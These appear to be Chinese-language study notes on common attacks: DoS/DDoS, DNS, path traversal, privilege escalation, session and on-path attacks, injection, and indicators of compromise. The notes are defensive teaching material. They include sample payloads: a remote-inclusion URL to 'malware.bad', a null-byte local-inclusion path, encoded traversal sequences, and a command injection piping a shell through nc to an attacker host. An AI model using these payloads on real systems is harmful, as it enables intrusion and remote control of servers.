# 惡意活動

## 惡意活動概述

-   **Malicious Activity**（惡意活動）：在數位時代中不斷演變的威脅行為，以驚人的速率出現新形式。
    -   網路攻擊是惡意活動的子集，對個人、企業和政府構成重大威脅
    -   這些攻擊不僅頻率增加，複雜度也在提高，對資安專業人員帶來挑戰
    -   了解網路威脅是有效預防和緩解的第一步

## 主要攻擊類型

-   **Distributed Denial of Service (DDoS)**（分散式阻斷服務攻擊）：一種透過多個來源同時發動的阻斷服務攻擊。

    -   相關變體包括：
        -   Denial of Service（阻斷服務攻擊）
        -   Amplified DDoS（放大型分散式阻斷服務攻擊）
        -   Reflected DDoS（反射型分散式阻斷服務攻擊）

-   **DNS Attacks**（域名系統攻擊）：針對 DNS 服務的各種攻擊手法。

    -   DNS cache poisoning（DNS 快取污染）
    -   DNS amplification attacks（DNS 放大攻擊）
    -   DNS tunneling（DNS 隧道技術）
    -   Domain hijacking（網域劫持）
    -   DNS zone transfer attacks（DNS 區域傳輸攻擊）

-   **Directory Traversal**（目錄遍歷攻擊）：也稱為路徑遍歷（Path Traversal），利用系統對使用者提供的檔案名稱輸入驗證或過濾不足的漏洞。

    -   攻擊者通過操作檔案路徑以訪問系統中受保護的目錄

-   **Privilege Escalation**（權限提升攻擊）：一種網路入侵類型，利用系統漏洞獲取對通常受保護資源的提升訪問權限。

    -   攻擊者從普通使用者權限提升至管理員或系統級權限
    -   可能導致完全控制受影響的系統

-   **Replay Attack**（重放攻擊）：涉及惡意或欺詐性地重複或延遲有效的資料傳輸。

    -   攻擊者攔截資料傳輸然後重新傳送
    -   可能導致重複交易或繞過身份驗證機制

-   **Session Hijacking**（會話劫持）：也稱為會話側錄（Session Sidejacking）、Cookie 劫持或會話金鑰劫持，攻擊者接管用戶的有效會話。

    -   攻擊者利用有效的電腦會話獲取未授權訪問
    -   可能導致未經授權地訪問系統內的信息或服務

-   **Malicious Code Injection**（惡意代碼注入攻擊）：廣泛的攻擊類別，攻擊者將有害代碼引入程序或系統，導致其以非預期方式運行。
    -   可能包括 SQL 注入、跨站腳本攻擊(XSS)等不同形式

## 入侵指標

-   **Indicators of Compromise (IoCs)**（入侵指標）：表明系統或網路可能已被入侵的跡象。
    -   Account lockouts（帳戶鎖定）
    -   Concurrent session utilization（並行會話使用）
    -   Block content（封鎖內容）
    -   Impossible travel（不可能的旅行）：短時間內從地理上不可能到達的不同位置登入
    -   Resource consumption（資源消耗）：異常的系統資源使用情況
    -   Resource inaccessibility（資源無法訪問）
    -   Out of cycle logging（非常規記錄）：日誌中出現非預期的事件記錄
    -   Publish documents that you've been hacked（發布已被入侵的文件）
    -   Missing log files（缺失的日誌檔案）

# DDoS 攻擊

## 基本概念

-   **Denial of Service Attack（阻斷服務攻擊）**：一種攻擊類別，不是特定的攻擊方式，而是透過多種方法使電腦、伺服器或網路裝置的資源無法使用
    -   目標可包括電腦、伺服器、交換器及路由器等網路設備

## DoS 攻擊類型

-   **Flood Attack（洪水攻擊）**：向目標伺服器傳送超過其處理能力的大量封包

    -   例如傳送 1,200 或 12,000 個請求，使伺服器超載而崩潰

-   **Ping Flood（Ping 洪水攻擊）**：透過傳送大量的 ping 請求（ICMP echo request 封包）使伺服器超載

    -   防禦方法：組織可設定防火牆阻擋 echo 回應，使攻擊請求被丟棄

-   **SYN Flood（SYN 洪水攻擊）**：攻擊者啟動多個 TCP 連線但不完成三向交握（three-way handshake）

    -   攻擊者使用偽造的 IP 位址傳送 SYN 封包，伺服器回應並等待確認，但永遠收不到回應
    -   伺服器為這些假連線保留資源，最終耗盡資源無法處理正常連線
    -   防禦方法：
        -   安裝洪水防護（flood guard）裝置於網路中
        -   在路由器或防火牆上啟用洪水防護功能
        -   設定伺服器在一段時間（如 10-30 秒）後中止半開連線
        -   使用入侵防禦系統（IPS）偵測和回應 SYN 洪水攻擊

-   **Permanent Denial of Service Attack（PDoS，永久性阻斷服務攻擊）**：利用安全漏洞修改網路裝置的韌體，使其永久性損壞

    -   裝置無法自行重啟，因作業系統被覆寫
    -   恢復方法：必須離線處理，重新載入完整韌體後才能上線

-   **Fork Bomb（分岔炸彈）**：建立大量處理程序耗盡電腦的處理能力
    -   每個處理程序（fork）可分岔成兩個，再分裂成四個，依此類推直到耗盡所有資源
    -   雖有自我複製性質，但不被視為蠕蟲，因為不會感染程式也不透過網路傳播
    -   它僅限於在單一電腦的處理器快取中擴散

## DDoS 攻擊

-   **Distributed Denial of Service Attack（DDoS，分散式阻斷服務攻擊）**：使用數百或數千台機器同時攻擊單一伺服器

    -   參與攻擊的機器通常不知道自己是攻擊的一部分，它們經常是殭屍網路（botnet）的一部分
    -   當收到攻擊指令時，所有機器同時向目標發送攻擊負載

-   **DNS Amplification Attack（DNS 放大攻擊）**：特殊類型的 DDoS 攻擊
    -   攻擊者使用偽造的目標 IP 位址發起 DNS 請求
    -   DNS 伺服器回應這些請求，將回應傳回目標伺服器
    -   由於 DNS 請求使用很少頻寬，但回應需要更多頻寬，因此攻擊效果被放大

## 真實案例

-   2018 年 3 月，GitHub 網站遭受了迄今為止規模最大的 DDoS 攻擊
    -   數萬個端點進行協調攻擊，流量高峰達到 1.35 Tbps（兆比特/秒）
    -   網站僅下線 5 分鐘

## DDoS 防禦技術

-   **Blackholing/Sinkholing（黑洞/水槽技術）**：識別攻擊 IP 地址，將其流量導向不存在的伺服器

    -   有效暫時阻止攻擊，但攻擊者可輕易更換 IP 位址重新攻擊

-   **入侵防禦系統（IPS）**：可識別並回應小規模的 DoS 攻擊

    -   但對大規模 DDoS 攻擊處理能力有限

-   **彈性雲端基礎架構**：建立可隨需求增加而擴展的基礎設施，以承受 DDoS 攻擊

    -   缺點：隨著資源使用量增加，服務提供商費用也會增加，且這些流量不會產生任何收益

-   **專業雲端防護服務**：如 CloudFlare 和 Akamai 提供的服務
    -   提供應用程式過濾和內容分發服務
    -   具備高度穩健和高可用性的網路，能承受 DDoS 攻擊
    -   提供 OSI 模型各層的額外防禦措施

# DNS 攻擊與防禦

-   **Domain Name System（網域名稱系統）**：負責將人類易懂的網域名稱轉換為電腦可理解的 IP 位址的網際網路基礎組件。
    -   由於其關鍵角色，DNS 成為網路攻擊的主要目標。

## DNS 攻擊類型

-   **DNS Cache Poisoning（DNS 快取污染）**：又稱 DNS Spoofing（DNS 詐騙）

    -   定義：攻擊者利用漏洞將錯誤資訊植入 DNS 解析器的快取資料中，導致解析器將流量導向攻擊者設置的錯誤 IP 位址。
    -   範例：攻擊者污染銀行網站的 DNS 快取，使用戶被重新導向到釣魚網站，從而竊取登入憑證。
    -   防禦措施：
        -   實施 DNSSEC（Domain Name System Security Extensions，網域名稱系統安全擴充）為 DNS 資料添加數位簽章
        -   建立安全的網路配置和防火牆以防止未授權存取 DNS 伺服器

-   **DNS Amplification Attack（DNS 放大攻擊）**：

    -   定義：攻擊者利用 DNS 解析過程，發送帶有受害者偽造 IP 位址的 DNS 查詢到開放 DNS 伺服器，使大量回應流量湧向受害者。（＊放大的意思是向 DNS server 發出查詢的請求流量小，但回應的流量大）
    -   範例：攻擊者向開放 DNS 伺服器發送請求整個網域主機列表的小型查詢，造成大量資料被發送到被害者的 IP 位址，形成類似 DoS 攻擊的效果。
    -   防禦措施：
        -   限制 DNS 回應的大小
        -   對 DNS 回應流量實施速率限制

-   **DNS Tunneling（DNS 通道技術）**：

    -   定義：使用 DNS 協議封裝非 DNS 流量（如 HTTP 或 SSH）並通過 53 連接埠傳輸，以繞過組織防火牆並進行指揮控制或資料外洩。
    -   說明：雖然這是一種合法技術，但常被攻擊者用於惡意目的。
    -   範例：攻擊者利用 DNS 通道繞過公司防火牆，竊取敏感組織資料，由於 DNS 請求通常可不經檢查通過防火牆，所以這種方法相當有效。
    -   防禦措施：
        -   定期監控和分析 DNS 日誌，尋找可能代表 DNS 通道使用的異常模式或行為

-   **Domain Hijacking（網域劫持）**：又稱 Domain Theft（網域盜竊）

    -   定義：未經原註冊人許可，更改網域名稱的註冊資訊。
    -   後果：可能導致網站控制權喪失，流量被導向惡意網站。
    -   範例：攻擊者劫持熱門電子商務網站網域（如 amazon.com），將所有流量重新導向到假冒網站，從而竊取客戶的付款資訊。
    -   防禦措施：
        -   定期更新並確保註冊帳戶資訊安全
        -   使用網域註冊鎖定服務，防止未經授權修改網域註冊資訊

-   **DNS Zone Transfer Attack（DNS 區域傳輸攻擊）**：
    -   定義：攻擊者偽裝成授權系統，嘗試獲取整個 DNS 區域資料（包含網域的所有 DNS 記錄）。
    -   風險：可揭露網域的網路基礎設施敏感資訊，並用作未來攻擊的偵察資料。

## 重要防禦概念

DNS 攻擊利用網域名稱系統的漏洞來中斷服務、竊取資訊或重新導向網站流量。透過理解攻擊原理，組織可實施適當機制預防攻擊發生。

# 目錄遍歷攻擊

-   **Directory Traversal Attack（目錄遍歷攻擊）**：一種注入攻擊，允許攻擊者通過應用程式介面訪問非預期的檔案和目錄

    -   攻擊者可通過操作含有「dot-dot-slash (../)」序列或絕對檔案路徑，訪問檔案系統上的任意檔案和目錄
    -   允許存取非預期連接到網站文件根目錄的命令、檔案和目錄

-   **Web Document Root（網站文件根目錄）**：網頁伺服器尋找網頁檔案的基礎目錄

    -   這不是硬碟的根目錄，而是網站檔案的根目錄位置
    -   目錄遍歷攻擊嘗試突破這個邊界，訪問根目錄之外的檔案

-   **目錄遍歷語法**：

    -   Unix/Linux/Mac 系統：使用 `../` 進行目錄向上回溯
    -   Windows 系統：使用 `..\` 進行目錄向上回溯
    -   Windows 系統通常同時接受 `/` 和 `\` 兩種分隔符

-   **URL 編碼繞過**：攻擊者可使用 URL 編碼來隱藏目錄遍歷嘗試

    -   例如：`%2e%2e%2f` 等同於 `../`
    -   攻擊者可能會使用不同深度的遍歷嘗試，以防止較長序列被阻擋

-   **Unicode 繞過**：

    -   某些應用程式會在使用路徑前進行規範化，允許某些 Unicode 字元轉換成點號，從而繞過安全檢查
    -   這種方法利用 Unicode 等價性和相容性字元繞過輸入驗證

-   **File Inclusion（檔案包含）**：與目錄遍歷相關的漏洞，分為兩種類型

    -   **Remote File Inclusion（遠端檔案包含）**：攻擊者嘗試執行腳本，將遠端檔案注入網站

        -   例如：`https://example.com/login.php?user=http://malware.bad/malicious.php`
        -   攻擊者利用參數傳遞引入惡意腳本檔案

    -   **Local File Inclusion（本地檔案包含）**：攻擊者嘗試添加已存在於伺服器上的檔案
        -   例如：`https://example.com/login.php?user=../../Windows/system32/cmd.exe%00`
        -   常與目錄遍歷結合使用，存取系統關鍵檔案
        -   `%00` 是空字元，用於繞過會自動添加副檔名（如 `.php`）的安全機制

-   **識別特徵**：

    -   在 URL 或參數中出現 `../`、`..%2f`、`..\\` 等模式是目錄遍歷攻擊的明顯標誌

-   **影響範圍**：
    -   成功的目錄遍歷可能導致敏感資訊洩露（如配置檔案、密碼檔案）
    -   允許攻擊者執行系統命令、上傳惡意檔案或建立後門

# 執行與提權攻擊

-   **Arbitrary Code Execution**（任意程式碼執行）：一種允許攻擊者在受害系統上執行自己程式碼的漏洞

    -   攻擊者能夠在系統上執行他們想運行的任何程式，而系統無法阻止
    -   這裡的「任意」意味著攻擊者可按照自己的意願執行程式碼

-   **Remote Code Execution (RCE)**（遠端程式碼執行）：一種允許攻擊者從遠端主機傳輸程式碼到目標主機並執行的漏洞

    -   是任意程式碼執行的一種特殊類型
    -   與任意程式碼執行的區別：透過網際網路（遠端）執行而非直接接觸目標機器

-   **Privilege Escalation**（權限提升）：當使用者存取或修改他們通常無權使用的特定資源時發生

    -   攻擊者的目標是獲取管理員或 root 層級權限
    -   對於攻擊者來說，獲取網域管理員權限是最理想的結果

-   **Vertical Privilege Escalation**（垂直權限提升）：使用者從普通權限升級到更高層級的權限

    -   典型案例是攻擊者透過釣魚郵件讓受害者點擊連結，執行惡意程式碼獲取系統管理員權限
    -   從普通使用者提升到管理員或 root 權限

-   **Horizontal Privilege Escalation**（水平權限提升）：使用者在相同權限層級下存取或修改其他使用者的資源

    -   例如：在共享硬碟上存取其他使用者的檔案或以其他相同權限層級使用者的身分執行操作
    -   不涉及獲取更高層級的權限，而是在相同層級獲取其他使用者的資源存取權

-   **Privileges**（權限）：應用程式或進程必須擁有的權限，用於讀取、寫入資料以及執行功能

    -   如果攻擊者能夠入侵應用程式，他們可以以該應用程式的權限執行惡意程式碼
    -   例如：系統進程通常使用 System 帳戶運行，若被攻破，攻擊者的程式碼也會以 System 權限運行

-   **Rootkit**（隱匿軟體）：一種修改系統檔案（通常在核心層級）以隱藏其存在的惡意軟體

    -   非常難以偵測，可幫助攻擊者隱藏在系統中
    -   能安裝其他惡意軟體，在系統重啟或使用者登出後保持持久性

-   **Rings**（環）：電腦系統的權限層級架構，從最高權限到最低權限

    -   Ring 0（環零）：核心層級，具有最高權限的訪問
    -   越往外層，權限越低

-   **Kernel Mode Rootkit**（核心模式隱匿軟體）：在 Ring 0（核心層級）運行的隱匿軟體

    -   具有對系統的完全控制權
    -   是最危險的隱匿軟體類型

-   **User Mode Rootkit**（使用者模式隱匿軟體）：在使用者空間運行的隱匿軟體
    -   可能有管理員權限，但必須使用作業系統功能（如登錄檔或工作排程器）來維持持久性
    -   相較核心模式隱匿軟體危險性較低

# 重放攻擊（Replay Attack）

-   **Replay Attack**（重放攻擊）：一種網路攻擊，攻擊者惡意或欺詐性地重新廣播、重複或延遲有效的資料傳輸

    -   類似於會話劫持（Session Hijack），但不同之處在於：會話劫持目的是即時修改傳送和接收的資訊，而重放攻擊則是截取資料後，分析並決定是否稍後重新傳送
    -   攻擊者截取合法的網路通訊數據，並在稍後重新發送這些數據以獲取未授權的訪問權限

-   **Credential Replay Attack**（憑證重放攻擊）：特別針對使用者的登入憑證，以獲取未授權的系統存取權限

    -   例如：攻擊者捕獲用戶登入銀行或購物網站的會話，獲取用戶名和密碼等憑證，稍後使用這些憑證登入受害者的帳戶
    -   攻擊者可利用獲取的憑證進行未授權購物、更改帳戶密碼，甚至完全接管受害者的帳戶

-   **Session Token**（會話令牌）：每個會話產生的唯一數據片段，用於唯一識別認證會話的發生時間

    -   會話令牌能有效防止重放攻擊，因為它使攻擊者難以重播會話
    -   攻擊者可能會竊取或操縱傳輸中的會話令牌以獲取個人資訊

-   **Multi-factor Authentication**（多因素認證）：預防重放攻擊的有效方式

    -   攻擊者無法獲得認證所需的額外資訊，例如每 30-60 秒變更一次的一次性密碼
    -   使用多因素認證後，攻擊者幾乎不可能通過捕獲和重播會話來獲取帳戶存取權

-   **防禦措施**：
    -   使用最新的安全協議，如 WPA3（Wi-Fi Protected Access 3）
    -   使用會話令牌唯一識別每次認證會話
    -   啟用多因素認證，特別是使用智慧型手機認證應用程式的一次性密碼
    -   提高對重放攻擊的認識和了解，是保護個人資料和防範網路威脅的重要步驟

# 網頁安全與會話管理

## 會話管理基礎

-   **Session Management**（會話管理）：一種安全機制，使網站應用程式能夠跨多個行動和請求唯一識別用戶，同時維護用戶生成的數據狀態。

    -   會話管理是現代網頁應用程式中的基礎安全組件
    -   能夠追蹤用戶在網站上的活動（如觀看的課程、通過的測驗等）
    -   儲存用戶狀態資訊，以便用戶下次登入時恢復

-   **HTTP Protocol**（HTTP 協議）：一種無狀態協議，伺服器默認不保留任何用戶資訊。
    -   由於 HTTP 是無狀態的，需要使用 cookie 或資料庫來儲存用戶資訊
    -   需要額外機制來維護用戶會話

## Cookie 技術

-   **Cookie**（Cookie）：一種用於儲存用戶資訊的文字檔案，當用戶瀏覽網站時使用。

    -   當伺服器首次發送 HTTP 響應頭時創建
    -   後續的用戶請求標頭會包含這個 cookie，實現資訊的往返傳輸
    -   由於會在網際網路上傳輸，需要特別注意保護措施

-   **Session Cookie**（會話 Cookie）：非持久性的 cookie，存在於記憶體中。

    -   當關閉瀏覽器時會自動刪除
    -   僅在當前瀏覽會話中有效

-   **Persistent Cookie**（持久性 Cookie）：長時間保留的 cookie。

    -   存儲在瀏覽器緩存中，直到被用戶刪除或達到設定的過期日期
    -   可以設定特定的有效期（例如七天）

-   **Cookie Encryption**（Cookie 加密）：保護 cookie 內容的重要安全措施。
    -   當 cookie 中儲存機密資訊時，應確保加密
    -   加密能確保資訊的機密性
    -   是防止 cookie 內容被竊取或修改的重要手段

## 會話劫持攻擊

-   **Session Hijacking**（會話劫持）：一種欺騙攻擊，攻擊者中斷主機連接並用自己的機器替代，冒充原始主機 IP 位址。

    -   通常通過竊取或修改 cookie 來實現
    -   攻擊者可以通過獲取用戶的 cookie 來假冒用戶身份
    -   是網站安全中常見的威脅

-   **Session Prediction**（會話預測）：一種欺騙攻擊，攻擊者嘗試預測會話令牌以劫持會話。
    -   會話令牌應使用不可預測的演算法生成
    -   會話令牌不應洩露任何關於會話客戶端的資訊
    -   會話令牌應該是在會話期間的一次性憑證
    -   如果會話令牌可被預測，攻擊者可以猜測並接管用戶會話

## Cookie 相關攻擊

-   **Cookie Poisoning**（Cookie 中毒）：在 cookie 被生成並發送到客戶端瀏覽器後修改 cookie 內容，以利用網站應用程式的漏洞。
    -   修改後的 cookie 可用於攻擊網站應用程序
    -   對抗方法：
        -   驗證網頁應用程式的輸入，檢查被篡改的 cookie
        -   在傳輸和儲存過程中對 cookie 進行加密
        -   當客戶端結束會話時從瀏覽器緩存中刪除 cookie

## 安全最佳實踐

-   **Cookie Security Attributes**（Cookie 安全屬性）：提升用戶端會話儲存安全性的重要設置。

    -   **Secure**：僅在 HTTPS 請求中發送 cookie
    -   **HTTPOnly**：禁止客戶端腳本訪問 cookie
    -   **SameSite**：禁止向跨來源資源共享 cookie

-   **HttpOnly Cookie**（HttpOnly Cookie）：一種帶有額外安全功能的特殊瀏覽器 cookie，防止客戶端腳本訪問 cookie 數據。

    -   當伺服器設置 HttpOnly 標誌時，瀏覽器會限制 JavaScript 代碼通過 `document.cookie` API 讀取或操作該 cookie
    -   有效防止 XSS 攻擊竊取 cookie

-   **Cookie Management Principles**（Cookie 管理原則）：

    -   評估是否必須使用 cookie，或可以採用資料庫儲存等替代方案
    -   如必須使用 cookie，應確保：
        -   有限的時效性
        -   會話結束時刪除
        -   儲存數據時進行加密

-   **Session Cookie Security**（會話 Cookie 安全）：對會話 cookie 的額外保護措施。

    -   針對 Django、JavaScript、Nginx 和 Apache 等平台有特定的安全配置方法
    -   對會話 cookie 的保護對於網站應用程式及其用戶的安全至關重要

-   **Session Management Threats**（會話管理威脅）：
    -   會話固定攻擊（Session Fixation Attack）：利用網頁應用程式的認證和會話管理缺陷，在用戶瀏覽器中"固定"已建立的會話
    -   不同於會話劫持，但同樣危險

# On-Path Attack

-   **On-path Attack**（路徑攻擊）：攻擊者將自己的裝置放置在兩個主機的通訊路徑中間，能夠透明地捕獲、監視和轉發這些主機之間的通訊。

    -   透過將自己放在客戶端和伺服器之間，攻擊者可以攔截授權封包並利用它們接管授權的會話
    -   又稱為「interception attack」（攔截攻擊）
    -   以前稱為「man-in-the-middle attack」（中間人攻擊）

-   **On-path Attack 的實施方式**：

    -   ARP poisoning（ARP 毒化、ARP 欺騙）
    -   DNS poisoning（DNS 毒化、DNS 欺騙）
    -   引入偽造的無線存取點
    -   引入偽造的分接交換器（hover switch）

-   **ARP Poisoning**（ARP 毒化）：在區域網路上進行的攻擊。

    -   攻擊者需要與受害裝置在同一子網路上
    -   ARP 沒有相關的安全或加密機制，使其相對容易受到攻擊

-   **Replay Attack**（重放攻擊）：攻擊者捕獲有效資料後立即重複或延遲後重複。

    -   常見於無線網路攻擊，但也可用於有線網路
    -   例如：若能捕獲兩個主機間的身份驗證交握，可以重放給身份驗證伺服器，使其誤認為攻擊者是已驗證的客戶端，從而獲取網路資源存取權

-   **Relay Attack**（轉發攻擊）：攻擊者通過將自己插入兩台主機之間成為對話的一部分。

    -   攻擊者成為兩個主機間的代理，可以讀取或修改它們之間的任何通訊
    -   通訊從客戶端傳送到攻擊者，再從攻擊者傳送到伺服器
    -   可以捕獲用戶名、密碼和其他敏感資料，甚至可以修改資料

-   **加密帶來的挑戰**：

    -   當主機強制執行加密時，重放和轉發攻擊變得更具挑戰性
    -   如使用 TLS 1.3 等強加密方案時，攔截和製作主機間通訊變得困難或不可能

-   **SSL Stripping**（SSL 剝離）：一種克服加密的技術。

    -   欺騙加密應用程式，使用戶收到 HTTP 連接而非 HTTPS 連接
    -   例如：將 facebook.com 的 HTTPS 重定向或降級為使用普通 HTTP，這樣通訊就不再加密

-   **Downgrade Attack**（降級攻擊）：當 SSL 剝離不可能時的替代方案。

    -   攻擊者試圖使客戶端或伺服器放棄其更高安全模式，改用較低的安全模式
    -   例如：將 TLS 1.3 降級為 SSL 2.0，後者更容易被破解
    -   影響範圍不僅限於 SSL 和 TLS，還包括 WiFi、VPN 等任何加密或保護機制
    -   攻擊者會在了解目標系統的模式後在已知數位路徑上等待，攔截並操控線上流量

-   **On-path Browser Attack**（瀏覽器路徑攻擊）：

    -   這種攻擊中間人位於使用者的瀏覽器內
    -   不需要在本地子網路或獲取本地網路存取權
    -   克服了 ARP 毒化攻擊的一些限制

-   **一般防禦措施**：
    -   使用強大的雙向認證
    -   實施強加密通訊
    -   攻擊者能夠實施這類攻擊的條件包括：能夠識別目標組件間的通訊性質和機制、能夠竊聽目標組件間的通訊，以及缺乏強雙向認證

# 常見注入攻擊

## LDAP 注入攻擊

-   **LDAP (Lightweight Directory Access Protocol)（輕量級目錄訪問協議）**：一種開放、廠商中立的行業標準應用協議，用於通過網際網路協議網路訪問和維護分佈式目錄信息服務。

    -   LDAP 常用於驗證身份和存儲用戶、群組及應用程式的相關信息。

-   **LDAP Injection（LDAP 注入）**：一種針對網頁應用程式的攻擊方式，透過偽造 LDAP 語句（通常通過用戶輸入）來操控應用邏輯。

    -   類似於 SQL 注入攻擊，攻擊者可以透過在 LDAP 搜尋中注入查詢，搜尋服務器上的用戶信息。
    -   範例：如果後端程式碼使用 `string ldapSearch = "(cn = $searchName")"`，攻擊者可以在用戶名欄位中輸入萬用字元 `*`，導致系統顯示所有用戶。

-   **防禦 LDAP 注入攻擊**：
    -   實施輸入驗證(input validation)
    -   輸入淨化(input sanitization)
    -   這些防禦措施與防禦 SQL 注入或 XML 注入相同

## 命令注入攻擊

-   **Command Injection（命令注入）**：當威脅行為者能夠通過易受攻擊的網路應用程式在主機上執行任意 Shell 命令時發生。

    -   範例：如應用程式允許用戶測試與遠程服務器的連接性，實際上後台使用 ping 命令，攻擊者可以通過附加命令進行注入。
    -   攻擊示例：用戶輸入 `diontraining.com && hostname`，實際執行 `ping diontraining.com && hostname`，同時顯示 ping 結果和伺服器主機名。
    -   更危險的示例：`diontraining.com && /bin/sh l nc hacked.diontraining.com 443`，建立通向攻擊者控制伺服器的遠程 shell。

-   **防禦命令注入攻擊**：
    -   對用戶輸入進行適當的輸入驗證
    -   僅接受特定格式的輸入（如 IP 地址或域名）
    -   忽略或不傳遞超出預期的輸入內容

## 程序注入攻擊

-   **Process Injection（程序注入）**：一種在獨立運行程序的地址空間中執行任意代碼的方法。

    -   在另一個程序的上下文中運行代碼可能允許訪問該程序的記憶體、系統或網路資源，甚至獲得提升的權限。
    -   透過程序注入執行的代碼可能逃避安全產品的檢測，因為執行被掩蓋在合法程序下。

-   **程序注入的常見方法**：

    -   通過 DLL 注入
    -   執行緒劫持(Thread execution hijacking)
    -   程序挖空(Process hollowing)
    -   程序分身(Process doppelganging)
    -   非同步程序調用(Asynchronous procedure calls)
    -   可攜式執行檔注入(Portable execution injections)

-   **緩解程序注入的方法**：
    -   使用端點安全解決方案，配置為阻止常見的攻擊行為序列
    -   利用安全內核模組
    -   實踐最小權限原則

# 常見的入侵指標（IoCs）

-   **Indicators of Compromise (IoCs)（入侵指標）**：是用於識別網路或系統上潛在惡意活動的數位鑑識資料片段，作為安全漏洞發生的數位證據。
    -   入侵指標是資安團隊和 IT 專業人員用於檢測資料洩漏、惡意軟體感染或其他威脅活動的重要線索
    -   透過監控入侵指標，組織能夠提前發現攻擊並迅速採取行動，防止漏洞發生或減輕損害
    -   並非所有的入侵指標都意味著真正的入侵，有時可能是系統錯誤、合法用戶活動或假陽性結果

## 常見入侵指標類型

-   **Account Lockouts（帳戶鎖定）**：因多次登入失敗而被鎖定的帳戶，可能表明有人嘗試暴力破解密碼。

    -   不同系統的帳戶鎖定政策有所不同，有些系統會在特定次數的失敗登入後鎖定帳戶
    -   鎖定時間可能是臨時的（如 15 分鐘或 4 小時後自動解鎖），或需要管理員手動解除
    -   需在安全性和可用性之間取得平衡，過於嚴格的鎖定政策可能導致支援電話增加和用戶不滿

-   **Concurrent Session Usage（並發工作階段使用）**：同一用戶帳戶的多個活動工作階段，可能表示帳戶已被入侵。

    -   例如：用戶從辦公室電腦登入，同時從不同地點也有活動工作階段
    -   如果一個工作階段在美國，另一個同時在歐洲，很可能表示帳戶已被入侵

-   **Blocked Content（被阻擋的內容）**：嘗試存取或下載被安全協議阻擋的內容。

    -   可能表示用戶嘗試存取惡意內容或攻擊者試圖下載敏感資料
    -   例如：重複嘗試下載被阻擋的檔案，可能表示用戶帳戶已被入侵並被用來竊取資料

-   **Impossible Travel（不可能的移動）**：在特定時間範圍內，從地理上相隔遙遠的不同地點登入系統。

    -   例如：帳戶在一小時內從紐約和倫敦登入，由於實際上無法在這麼短時間內完成這段旅程，表示帳戶可能已被入侵
    -   通常與並發工作階段使用一起討論，因為這兩種情況經常（但不總是）同時發生

-   **Resource Consumption（資源消耗）**：資源使用量（如 CPU、記憶體或網路頻寬）的異常峰值。

    -   可能表示惡意軟體感染或分散式阻斷服務攻擊（DDoS）正在進行
    -   例如：伺服器 CPU 使用率突然從平常的 20% 飆升至 90%，可能表示伺服器受到攻擊或已被入侵
    -   或者，瀏覽網頁時 GPU 使用率達 90%，可能表示系統已成為殭屍網路的一部分，被用於加密貨幣挖礦或其他需要大量計算資源的任務

-   **Resource Inaccessibility（資源無法存取）**：無法存取特定資源如檔案、資料庫或網路服務。

    -   可能表示勒索軟體攻擊，攻擊者加密受害者檔案並要求贖金
    -   例如：用戶突然無法存取檔案並收到勒索信息，明顯表示遭受了勒索軟體攻擊

-   **Out-of-cycle Logging（非常規時段的日誌記錄）**：在異常時間（如深夜或週末）出現的日誌條目。

    -   通常表示攻擊者試圖在非尖峰時段隱藏活動
    -   例如：辦公室通常關閉時（凌晨 3 點）的日誌活動，可能表示網路安全已被破壞

-   **Missing Logs（缺失的日誌）**：日誌記錄中的空缺或缺失。

    -   攻擊者經常刪除日誌以隱藏活動，使調查人員更難追蹤攻擊路徑
    -   例如：系統日誌突然出現數小時或數天的空缺，可能表明攻擊者篡改了日誌以掩蓋行蹤

-   **Published Documentation of Hack（公開發布的入侵文件）**：攻擊者公開宣稱已入侵系統。
    -   攻擊者可能為炫耀技能或造成組織聲譽損害而公開披露
    -   可能出現在社交媒體、駭客論壇、新聞文章或受害者自己的網站
    -   例如：公司網站被篡改並留有駭客組織宣稱負責的信息
